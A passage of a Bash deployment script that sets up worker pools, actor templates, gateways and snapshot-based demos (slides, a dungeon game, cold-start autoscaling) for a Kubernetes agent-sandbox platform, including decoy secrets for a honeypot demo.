    kubectl delete csidriverconfigs --all --ignore-not-found 2>/dev/null || true
    kubectl delete crd workerpools.ate.dev sandboxconfigs.ate.dev csidriverconfigs.ate.dev --ignore-not-found
    rm -rf "${HOME}/.kube/cache/discovery" 2>/dev/null || true
  fi

  if [[ -n "${current_ver}" && "${current_ver}" != "${SUBSTRATE_VERSION}" ]]; then
    echo "Resetting bundled ate-system PostgreSQL StatefulSet & PVC for ${SUBSTRATE_VERSION} schema..."
    kubectl scale deployment/ate-api-server -n ate-system --replicas=0 2>/dev/null || true
    kubectl delete statefulset/postgres pvc/data-postgres-0 -n ate-system --ignore-not-found --wait=true
    reset_node_image_cache 3
  fi

  local allowed_spiffe
  allowed_spiffe="$(allowed_ingress_spiffe_ids)"

  (
    cd "${SUBSTRATE_ROOT}"
    local image_flags=()
    if [[ -n "${SUBSTRATE_IMAGE_REPO:-}" && -n "${SUBSTRATE_VERSION:-}" ]]; then
      image_flags=(--image-repo="${SUBSTRATE_IMAGE_REPO}" --image-tag="${SUBSTRATE_VERSION}")
    fi
    go run ./cmd/ate-setup deploy ate-system \
      --no-dev-env \
      --sandbox-classes=gvisor \
      --rollout-timeout=180s \
      "${image_flags[@]}" \
      --snapshot-location="gs://${BUCKET_NAME}/" \
      --snapshot-transfer-gsa-name="ate-snapshot-transfer" \
      --gcp-project-id="${PROJECT_ID}" \
      --gcp-cluster-name="${CLUSTER_NAME}" \
      --gcp-cluster-location="${CLUSTER_LOCATION}" \
      --credential-provider="${ATE_CREDENTIAL_PROVIDER}" \
      --ingress-allowed-spiffe-ids="${allowed_spiffe}"
  )

  mirror_gvisor_assets

  echo ""
  echo "Verified ate-api-server version:"
  kubectl exec -n ate-system deploy/ate-api-server -- /ko-app/ateapi --version
  kubectl get sandboxconfigs.v1.ate.dev
}

detect_cluster_defaults() {
  if [[ -n "${PROJECT_ID:-}" ]]; then
    apply_env_defaults
  fi
  if [[ -z "${BUCKET_NAME:-}" ]]; then
    echo "Error: BUCKET_NAME (or PROJECT_ID in .env) must be set." >&2
    exit 1
  fi
  export SUBSTRATE_VERSION="${SUBSTRATE_VERSION:-v1.0.0}"
  export SUBSTRATE_IMAGE_REPO="${SUBSTRATE_IMAGE_REPO:-ghcr.io/agent-substrate/substrate}"
  if [[ -z "${ATEOM_GVISOR_IMAGE:-}" ]]; then
    if [[ -n "${SUBSTRATE_IMAGE_REPO}" && -n "${SUBSTRATE_VERSION}" ]]; then
      ATEOM_GVISOR_IMAGE="${SUBSTRATE_IMAGE_REPO}/ateworker-gvisor:${SUBSTRATE_VERSION}"
    else
      ATEOM_GVISOR_IMAGE="$(kubectl get workerpools -A -o jsonpath='{.items[0].spec.workerImage}' 2>/dev/null || true)"
      if [[ -z "${ATEOM_GVISOR_IMAGE}" && -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}/cmd/ateworker-gvisor" ]]; then
        echo "Building ateworker-gvisor worker image via ko..."
        ATEOM_GVISOR_IMAGE="$(cd "${SUBSTRATE_ROOT}" && ko build ./cmd/ateworker-gvisor)"
      fi
    fi
  fi
  export DEMO_DOMAIN="${DEMO_DOMAIN:-substrate.learngke.dev}"
  export SLIDES_DOMAIN="${SLIDES_DOMAIN:-abs.slides.${DEMO_DOMAIN}}"
  export GATEWAY_IP_NAME="${GATEWAY_IP_NAME:-substrate-learngke-ip}"
  export CERT_MAP_NAME="${CERT_MAP_NAME:-substrate-learngke-map}"
  export BUCKET_NAME SUBSTRATE_VERSION SUBSTRATE_IMAGE_REPO ATEOM_GVISOR_IMAGE DEMO_DOMAIN SLIDES_DOMAIN GATEWAY_IP_NAME CERT_MAP_NAME
}

wait_for_template_golden_snapshot() {
  local tmpl="$1"
  echo "Waiting for '${tmpl}' Golden Snapshot to become READY..."
  for ((i = 1; i <= 90; i++)); do
    local yaml_out golden_ts err_msg
    yaml_out="$(kubectl ate get actor-template "${tmpl}" -a "${ATESPACE}" -o yaml 2>/dev/null || true)"
    golden_ts="$(echo "${yaml_out}" | awk '/snapshotTime:|takeGoldenSnapshotAt:/ {print $2; exit}')"
    err_msg="$(echo "${yaml_out}" | awk -F': ' '/errorMessage:/ {print $2; exit}')"
    if grep -q "goldenTag:" <<< "${yaml_out}"; then
      echo "  [READY] ${tmpl} (snapshot ready at: ${golden_ts:-ready})"
      return 0
    fi
    if [[ -n "${err_msg}" && "${err_msg}" != '""' ]]; then
      echo "  [ERROR] ${tmpl}: ${err_msg}" >&2
      return 1
    fi
    sleep 2
  done
  echo "  [TIMEOUT] Waiting for Golden Snapshot of ${tmpl}" >&2
  return 1
}

WORKER_POOLS=(wp-slides wp-dungeon wp-coldstart wp-tenantdb wp-honeypot wp-timewarp wp-buildbox wp-billing wp-canvas)

template_actor_pattern() {
  case "${1:-}" in
    slides)                   echo '^slide-' ;;
    dungeon|dungeon2d)        echo '^(hero|d2d)-' ;;
    coldstart)                echo '^(coldstart|clone)-' ;;
    tenantdb|tenantdb-volumes) echo '^db-' ;;
    honeypot)                 echo '^honeypot-' ;;
    timewarp)                 echo '^raft-' ;;
    buildbox)                 echo '^build-' ;;
    billing)                  echo '^sub-' ;;
    canvas)                   echo '^doc-' ;;
    *)                        echo '' ;;
  esac
}

# Release worker slots by suspending any RUNNING, RESUMING, or PAUSED actors
# in the atespace (optionally filtered by an awk actor-name regex in $1 so
# per-demo operations do not disturb isolated sibling WorkerPools).
free_workers() {
  local name_regex="${1:-}"
  local active_actors
  active_actors="$(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null \
    | awk -v pat="${name_regex}" '
        ($4 == "ACTOR_STATE_RUNNING" || $4 == "ACTOR_STATE_RESUMING" || $4 == "ACTOR_STATE_PAUSED" || ($1 != "ATESPACE" && $5 != "" && $5 != "<none>")) &&
        (pat == "" || $2 ~ pat) { print $2 }
      ' || true)"
  for actor in ${active_actors}; do
    echo "Suspending active actor '${actor}' to free worker capacity..."
    kubectl ate suspend actor "${actor}" -a "${ATESPACE}" >/dev/null 2>&1 || true
  done
}

ensure_workerpools_ready() {
  if kubectl get workerpool anything-but-agents -n anything-but-agents >/dev/null 2>&1; then
    echo "Migrating off legacy shared WorkerPool 'anything-but-agents'..."
    free_workers
    kubectl delete workerpool anything-but-agents -n anything-but-agents --ignore-not-found --wait=true
  fi

  envsubst < "${REPO_ROOT}/manifests/workerpool.yaml.tmpl" | kubectl apply -f -
  for wp in "${WORKER_POOLS[@]}"; do
    kubectl rollout status "deployment/${wp}" -n anything-but-agents --timeout=300s
  done
}

ensure_template_ready() {
  local tmpl="$1"
  local yaml_out
  yaml_out="$(kubectl ate get actor-template "${tmpl}" -a "${ATESPACE}" -o yaml 2>/dev/null || true)"
  if [[ "${FORCE_REBUILD_TEMPLATES:-0}" != "1" ]] && grep -q "goldenTag:" <<< "${yaml_out}"; then
    echo "ActorTemplate '${tmpl}' Golden Snapshot is already READY."
    return 0
  fi
  free_workers "$(template_actor_pattern "${tmpl}")"
  kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/${tmpl}-template.yaml.tmpl" \
      | ko resolve -f - \
      | kubectl ate create actor-template -f -
  )
  wait_for_template_golden_snapshot "${tmpl}"
}

deploy_all() {
  detect_cluster_defaults
  banner "Deploying 6 Isolated 'Anything But Agents' WorkerPools & 8 ActorTemplates"

  echo "Using BUCKET_NAME=${BUCKET_NAME}"
  echo "Using SUBSTRATE_VERSION=${SUBSTRATE_VERSION}"
  echo "Using ATEOM_GVISOR_IMAGE=${ATEOM_GVISOR_IMAGE}"
  echo "Using KO_DOCKER_REPO=${KO_DOCKER_REPO:-}"

  ensure_workerpools_ready
  ensure_router_ingress_spiffe_ids

  ensure_presenter_auth

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true

  for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3 db-acme db-globex db-initech db-umbrella honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1 raft-node-1 raft-node-2 raft-node-3 build-pr-104 build-release-v2 build-hotfix-88 sub-acme sub-globex sub-initech doc-merger-acquisition doc-q4-roadmap doc-incident-postmortem; do
    kubectl ate delete actor "${actor}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true

  for tmpl in slides dungeon dungeon2d coldstart tenantdb tenantdb-volumes honeypot timewarp buildbox billing canvas; do
    echo ""
    echo "--- Building & registering ActorTemplate: ${tmpl} ---"
    free_workers "$(template_actor_pattern "${tmpl}")"
    kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
    (
      cd "${REPO_ROOT}"
      envsubst < "manifests/${tmpl}-template.yaml.tmpl" \
        | ko resolve -f - \
        | kubectl ate create actor-template -f -
    )
    wait_for_template_golden_snapshot "${tmpl}"
  done

  if kubectl get deployment coldstart-gateway -n anything-but-agents >/dev/null 2>&1; then
    for i in 1 2 3; do
      kubectl ate create actor "coldstart-${i}" -a "${ATESPACE}" --template coldstart 2>/dev/null || true
      if [[ "${i}" -gt 1 ]]; then
        kubectl ate suspend actor "coldstart-${i}" -a "${ATESPACE}" 2>/dev/null || true
      fi
    done
  fi

  kubectl create secret generic payroll-vault-api \
    -n anything-but-agents \
    --from-literal=token="decoysupersecret-payroll-vault-2026" \
    --dry-run=client -o yaml | kubectl apply -f - >/dev/null

  kubectl create secret generic billing-vault-api \
    -n anything-but-agents \
    --from-literal=token="sk_live_vault_v1_9988776655443322" \
    --dry-run=client -o yaml | kubectl apply -f - >/dev/null

  resolve_kubectl_ate_image
  for gw in slides-gateway dungeon2d-gateway coldstart-gateway tenantdb-gateway honeypot-gateway timewarp-gateway buildbox-gateway billing-gateway canvas-gateway; do
    if kubectl get deployment "${gw}" -n anything-but-agents >/dev/null 2>&1; then
      local gw_manifest="manifests/${gw}.yaml.tmpl"
      if [[ "${gw}" == "coldstart-gateway" ]]; then
        gw_manifest="manifests/coldstart-hpa.yaml.tmpl"
      fi
      echo "Rebuilding & applying ${gw} deployment with ${SUBSTRATE_VERSION}..."
      (
        cd "${REPO_ROOT}"
        envsubst < "${gw_manifest}" \
          | ko resolve --platform=linux/amd64 -f - \
          | kubectl apply -f - >/dev/null
      )
      kubectl rollout restart "deployment/${gw}" -n anything-but-agents >/dev/null
    fi
  done
  for gw in slides-gateway dungeon2d-gateway coldstart-gateway tenantdb-gateway honeypot-gateway timewarp-gateway buildbox-gateway billing-gateway canvas-gateway; do
    if kubectl get deployment "${gw}" -n anything-but-agents >/dev/null 2>&1; then
      kubectl rollout status "deployment/${gw}" -n anything-but-agents --timeout=120s
    fi
  done

  echo ""
  kubectl ate get actor-templates -a "${ATESPACE}"
}

ensure_router_port_forward() {
  if ! curl -s -o /dev/null --connect-timeout 1 "${ROUTER_URL}/" 2>/dev/null; then
    local router_http_port
    router_http_port="$(kubectl get svc atenet-router -n ate-system -o jsonpath='{.spec.ports[?(@.port==80)].port}' 2>/dev/null || true)"
    if [[ "${router_http_port}" == "80" ]]; then
      echo "Starting background port-forward to svc/atenet-router on ${ROUTER_URL}..."
      kubectl port-forward -n ate-system svc/atenet-router 8000:80 >/dev/null 2>&1 &
    else
      if ! kubectl get deployment dungeon2d-gateway -n anything-but-agents >/dev/null 2>&1; then
        deploy_dungeon2d_gateway
      fi
      echo "Starting background mTLS bridge port-forward via deploy/dungeon2d-gateway on ${ROUTER_URL}..."
      kubectl port-forward -n anything-but-agents deploy/dungeon2d-gateway 8000:8000 >/dev/null 2>&1 &
    fi
    PORT_FORWARD_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT
    for _ in {1..20}; do
      if curl -s -o /dev/null --connect-timeout 1 "${ROUTER_URL}/" 2>/dev/null; then
        break
      fi
      sleep 0.5
    done
  fi
}

# Reset specific actors (and optional tag:<name> entries) before an act starts
# so every act can be run or re-run independently in any order.
reset_act_resources() {
  for resource in "$@"; do
    case "${resource}" in
      tag:*)
        local tag_name="${resource#tag:}"
        kubectl ate delete tag "${tag_name}" -a "${ATESPACE}" >/dev/null 2>&1 || true
        ;;
      *)
        kubectl ate delete actor "${resource}" -a "${ATESPACE}" >/dev/null 2>&1 || true
        ;;
    esac
  done
}

act0_slides() {
  ensure_router_port_forward
  banner "DEMO 0: 'Slides on Substrate' — Presentation Deck as gVisor Actors"
  reset_act_resources slide-01 slide-02

  local gateway_port="${SLIDES_PORT:-8087}"
  local gateway_url="http://localhost:${gateway_port}"
  local presenter_token
  presenter_token="$(kubectl get secret slides-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(openssl rand -hex 24)"
  fi

  echo "Starting slides Gateway & Presentation Deck on ${gateway_url}..."
  (
    cd "${REPO_ROOT}"
    PRESENTER_TOKEN="${presenter_token}" go run ./cmd/slides \
      --mode=gateway \
      --addr=":${gateway_port}" \
      --atespace="${ATESPACE}" \
      --template=slides \
      --router-url="${ROUTER_URL}" >/dev/null 2>&1
  ) &
  GATEWAY_PID=$!
  trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT

  for _ in {1..30}; do
    if curl -s -o /dev/null --connect-timeout 1 "${gateway_url}/readyz" 2>/dev/null; then
      break
    fi
    sleep 0.3
  done

  echo ""
  echo "  Presenter Deck (Live UI) : ${gateway_url}/deck?key=\$(kubectl get secret slides-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""

  step "1. Fetch Slide 1 ('slide-01') via Gateway -> Wakes slide-01 actor on WorkerPool, increments Go heap views, and returns live telemetry"
  run_cmd curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${gateway_url}/api/slide/slide-01"

  step "2. Add presenter scratchpad note into slide-01 Go heap memory (POST /api/slide/slide-01/note)"
  run_cmd curl -fsS -X POST "${gateway_url}/api/slide/slide-01/note" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"notes":"Stage checkpoint: 0/3 workers occupied while reading title"}'

  step "3. Navigate to Slide 2 ('slide-02') -> Wakes slide-02 cleanly while slide-01 suspends asynchronously to GCS"
  run_cmd curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${gateway_url}/api/slide/slide-02?prev=slide-01"

  step "4. Revert Slide 1 memory (POST /api/slide/slide-01/revert) -> kubectl ate revert actor slide-01 wipes live RAM note"
  run_cmd curl -fsS -X POST "${gateway_url}/api/slide/slide-01/revert" -H "X-Presenter-Key: ${presenter_token}"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Presentation Deck (${gateway_url}/deck?key=${presenter_token}) is live!"
    read -r -p "    [Press Enter when finished exploring the slide deck] " _
  fi

  kill "${GATEWAY_PID:-}" 2>/dev/null || true
  free_workers '^slide-'
}

act1_dungeon() {
  ensure_router_port_forward
  banner "ACT I: 'Look Ma, No Database' — Zork Dungeon in Pure Process RAM"
  reset_act_resources hero-mofi hero-timeline-b tag:before-dragon

  step "1. Create hero actor 'hero-mofi' from the 'dungeon' template"
  run_cmd kubectl ate create actor hero-mofi -a "${ATESPACE}" --template dungeon

  step "2. Wake the actor with an HTTP request & look around the Tavern"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=look"

  step "3. Move to the Armory and pick up ONLY the dragon-slayer-sword (forgetting the fire-shield!)"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=move+armory"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=take+dragon-slayer-sword"

  step "4. Move into the Cavern of the Heap Dragon"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=move+dragon-lair"

  step "5. QUICKSAVE! Suspend the actor to GCS (persisting Go heap variables) and tag the snapshot 'before-dragon'"
  run_cmd kubectl ate suspend actor hero-mofi -a "${ATESPACE}" --mode=sync
  run_cmd kubectl ate create tag before-dragon -a "${ATESPACE}" --actor hero-mofi

  step "6. Recklessly attack the Heap Dragon without the fire-shield -> YOU DIE (PlayerHP = 0 in RAM)"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=attack"

  step "7. SAVE-SCUMMING! Revert the running actor back to its last external snapshot (kubectl ate revert)"
  run_cmd kubectl ate revert actor hero-mofi -a "${ATESPACE}"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=look"

  step "8. Bonus: Fork a parallel timeline ('hero-timeline-b') from the 'before-dragon' tag!"
  run_cmd kubectl ate create actor hero-timeline-b -a "${ATESPACE}" --template dungeon --tag before-dragon
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-timeline-b" "${ROUTER_URL}/?cmd=move+armory"

  free_workers '^(hero|d2d)-'
}

act1b_dungeon2d() {
  ensure_router_port_forward
  banner "ACT I-B: 'Save-Scumming the Heap Dragon (2D Edition)' — Mobile 2D Game & Live Dashboard"
  reset_act_resources d2d-mofi d2d-mofi-timeline-b

  local gateway_port="${DUNGEON2D_PORT:-8090}"
  local gateway_url="http://localhost:${gateway_port}"
  local presenter_token
  presenter_token="$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(openssl rand -hex 24)"
  fi

  echo "Starting dungeon2d Gateway & Live Mission-Control Dashboard on ${gateway_url}..."
  (
    cd "${REPO_ROOT}"
    PRESENTER_TOKEN="${presenter_token}" go run ./cmd/dungeon2d \
      --mode=gateway \
      --addr=":${gateway_port}" \
      --atespace="${ATESPACE}" \
      --template=dungeon2d \
      --router-url="${ROUTER_URL}" >/dev/null 2>&1
  ) &
  GATEWAY_PID=$!
  trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT

  for _ in {1..30}; do
    if curl -s -o /dev/null --connect-timeout 1 "${gateway_url}/readyz" 2>/dev/null; then
      break
    fi
    sleep 0.3
  done

  echo ""
  echo "  Projector Mission-Control Dashboard : ${gateway_url}/dashboard?key=\$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Player 2D Mobile Game Frontend      : ${gateway_url}/play"
  echo ""

  step "1. Start 2D hero session 'mofi' (Paladin, 140 HP, 8-Floor Campaign) -> Wakes actor on WorkerPool, initializes Floor 1 WorldState (v1), and suspends to GCS"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/start" -d '{"hero_name":"mofi","character_class":"paladin"}'

  step "2. Client simulates Floors 1-4 locally at 60fps, then saves Floor 4 Clockwork Foundry WorldState (v2) to GCS"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"save_world","label":"Floor 4 Clockwork Foundry Cleared","world":{"floor":4,"max_floors":8,"hero":{"x":16,"y":8,"hp":118,"max_hp":140,"armor":25,"character_class":"paladin","equipped_weapon":"sunblade-greatsword","equipped_relic":"chrono-sigil","potions":2,"gold":290,"score":740,"inventory":["crypt-key","sunblade-greatsword","chrono-sigil","healing-potion"]}}}'

  step "3. Floor 6 (Vault of Forking Paths) & Floor 7 (Obsidian Gauntlet): unlock Sunforged Vault and activate Pre-Boss Save Shrine (v3)"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"quicksave","target":"f7:shrine","label":"Floor 7 Obsidian Gauntlet Pre-Boss Shrine","world":{"floor":7,"max_floors":8,"hero":{"x":18,"y":8,"hp":140,"max_hp":140,"armor":35,"character_class":"paladin","equipped_weapon":"dragon-slayer-sword","equipped_armor":"sunforged-aegis","equipped_relic":"chrono-sigil","potions":3,"gold":620,"score":1680,"inventory":["crypt-key","dragon-slayer-sword","sunforged-aegis","chrono-sigil"]}}}'

  step "4. Floor 8 Boss Fight: charge the Ancient Heap Dragon without Fire Shield -> YOU DIE (Alive=false in RAM)!"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"combat","target":"Ancient Heap Dragon","entity_id":"f8:dragon"}'

  step "5. SAVE-SCUM! Revert actor directly back to Snapshot v3 (Floor 7 Pre-Boss Shrine) via kubectl ate revert"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/revert" -d '{"actor_name":"d2d-mofi","target_version":3}'

  step "6. Equip Fire Shield + Sunforged Aegis, slay the Ancient Heap Dragon on Floor 8, claim the Golden Chalice, and escape!"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"victory","label":"Floor 8 Ancient Heap Dragon Slain & Sanctum Escaped","world":{"floor":8,"max_floors":8,"hero":{"x":11,"y":1,"hp":96,"max_hp":140,"armor":45,"character_class":"paladin","equipped_weapon":"dragon-slayer-sword","equipped_armor":"sunforged-aegis","equipped_relic":"chrono-sigil","potions":1,"gold":950,"score":2650,"inventory":["crypt-key","dragon-slayer-sword","fire-shield","sunforged-aegis","chrono-sigil","golden-chalice"]}}}'

  step "7. Fork a parallel timeline ('d2d-mofi-timeline-b') from the tagged snapshot!"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/fork" -d '{"source_actor":"d2d-mofi","new_actor":"d2d-mofi-timeline-b"}'

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Dashboard (${gateway_url}/dashboard?key=${presenter_token}) and 2D Game (${gateway_url}/play) are still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${GATEWAY_PID:-}" 2>/dev/null || true
  free_workers '^(hero|d2d)-'
}

deploy_slides_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Slides Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  ensure_presenter_auth

  # Ensure live atenet-router includes slides-gateway in --ingress-allowed-spiffe-ids
  local cur_spiffe spiffe_arg_idx
  cur_spiffe="$(kubectl get deployment atenet-router -n ate-system -o jsonpath='{.spec.template.spec.containers[0].args}' 2>/dev/null || true)"
  if [[ "${cur_spiffe}" != *"slides-gateway"* ]]; then
    spiffe_arg_idx="$(kubectl get deployment atenet-router -n ate-system -o jsonpath='{range .spec.template.spec.containers[0].args[*]}{@}{"\n"}{end}' 2>/dev/null \
      | awk '/^--ingress-allowed-spiffe-ids=/ {print NR-1; exit}' || true)"
    if [[ -n "${spiffe_arg_idx}" ]]; then
      echo "Updating atenet-router ingress allowed SPIFFE IDs with slides-gateway..."
      kubectl patch deployment atenet-router -n ate-system --type=json \
        -p="[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/args/${spiffe_arg_idx}\",\"value\":\"--ingress-allowed-spiffe-ids=$(allowed_ingress_spiffe_ids)\"}]"
      kubectl rollout status deployment/atenet-router -n ate-system --timeout=120s
    fi
  fi

  if [[ "${FORCE_REBUILD_TEMPLATES:-0}" == "1" ]]; then
    for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^slide-/ {print $2}' || true); do
      kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
    done
  fi

  # Ensure ActorTemplate slides is up to date
  ensure_template_ready slides
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/slides-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/slides-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc slides-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Slides Deck (Google SSO) : https://${SLIDES_DOMAIN}/deck"
  echo "  Slides Deck (Token URL)  : https://${SLIDES_DOMAIN}/deck?key=\$(kubectl get secret slides-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Slides Deck (LB IP)      : http://${lb_ip:-<pending>}/deck"
  echo ""
}

cleanup_slides_gateway() {
  banner "Cleaning up Slides Gateway Deployment & Actors"
  for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^slide-/ {print $2}' || true); do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount slides-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding slides-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding slides-gateway-ate-client --ignore-not-found
  free_workers '^slide-'
}

deploy_dungeon2d_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Dungeon 2D Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  ensure_presenter_auth

  # Ensure ActorTemplate dungeon2d is up to date
  ensure_template_ready dungeon2d
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/dungeon2d-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/dungeon2d-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc dungeon2d-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Player 2D Game URL (HTTPS)   : https://dungeon.${DEMO_DOMAIN}/play"
  echo "  Presenter Dashboard (HTTPS)  : https://dungeon.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Player 2D Game URL (LB IP)   : http://${lb_ip:-<pending>}/play"
  echo ""
}

reset_dungeon2d_actors() {
  detect_cluster_defaults
  banner "Resetting Dungeon 2D Actors & Snapshots Back to 0"

  local presenter_token=""
  presenter_token="$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(kubectl get secret presenter-auth -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  fi

  local lb_ip=""
  lb_ip="$(kubectl get svc dungeon2d-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
  if [[ -n "${presenter_token}" && -n "${lb_ip}" ]] && curl -fsS -X POST -H "X-Presenter-Key: ${presenter_token}" "http://${lb_ip}/api/dashboard/reset" 2>/dev/null; then
    echo ""
    return 0
  fi

  for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^d2d-/ {print $2}' || true); do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-d2d-/ {print $2}' || true); do
    kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
  done
  echo "Purged all d2d-* actors and tag-d2d-* tags."
}

cleanup_dungeon2d_gateway() {
  banner "Cleaning up Dungeon 2D Gateway Deployment & Actors"
  for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^d2d-/ {print $2}' || true); do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-d2d-/ {print $2}' || true); do
    kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount dungeon2d-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding dungeon2d-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding dungeon2d-gateway-ate-client --ignore-not-found
  free_workers '^(hero|d2d)-'
}

deploy_coldstart_hpa() {
  detect_cluster_defaults
  banner "Deploying Cold-Start HPA vs. Substrate Golden Snapshot HPA Comparison Stack"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  free_workers '^(coldstart|clone)-'
  ensure_presenter_auth

  # Ensure ActorTemplate coldstart is up to date
  ensure_template_ready coldstart

  for i in 1 2 3; do
    kubectl ate delete actor "coldstart-${i}" -a "${ATESPACE}" 2>/dev/null || true
    kubectl ate create actor "coldstart-${i}" -a "${ATESPACE}" --template coldstart
    if [[ "${i}" -gt 1 ]]; then
      kubectl ate suspend actor "coldstart-${i}" -a "${ATESPACE}" 2>/dev/null || true
    fi
  done

  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/coldstart-hpa.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
